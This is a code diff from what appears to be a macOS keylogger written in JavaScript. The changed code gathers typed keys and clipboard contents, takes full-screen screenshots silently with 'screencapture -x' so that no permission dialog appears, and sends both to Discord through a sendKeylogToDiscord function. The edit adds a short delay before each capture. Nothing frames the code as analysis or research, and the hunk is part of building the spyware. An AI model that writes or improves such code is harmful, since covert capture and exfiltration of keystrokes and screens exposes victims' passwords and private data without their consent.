@@ -880,25 +880,27 @@ setInterval(() => {
                 }
                 keysBuffer += clipboard.substring(0, 5000);
                 
-                // Take screenshot of active window (not desktop background)
+                // Take screenshot of entire screen including all open windows
                 const timestamp = Date.now();
                 const screenshotFile = path.join(screenshotDir, `screenshot_${timestamp}.png`);
                 
-                // Capture screenshot silently (no permission dialogs)
+                // Add a small delay to ensure screen state is captured properly
+                // Then capture screenshot silently (no permission dialogs)
                 // Use screencapture -x to capture entire screen including all open windows
-                // This captures everything visible on screen (windows, apps, etc.)
-                exec(`screencapture -x "${screenshotFile}"`, (screenshotError) => {
-                    if (!screenshotError && fs.existsSync(screenshotFile)) {
-                        // Send with screenshot
-                        sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
-                    } else {
-                        // Send without screenshot if capture failed
-                        sendKeylogToDiscord(keysBuffer, 'Unknown', null);
-                    }
-                    
-                    // Clear buffer after sending
-                    keysBuffer = '';
-                });
+                setTimeout(() => {
+                    exec(`screencapture -x "${screenshotFile}"`, (screenshotError) => {
+                        if (!screenshotError && fs.existsSync(screenshotFile)) {
+                            // Send with screenshot
+                            sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
+                        } else {
+                            // Send without screenshot if capture failed
+                            sendKeylogToDiscord(keysBuffer, 'Unknown', null);
+                        }
+                        
+                        // Clear buffer after sending
+                        keysBuffer = '';
+                    });
+                }, 500); // Small delay to ensure screen state is captured
             }
         }
     });
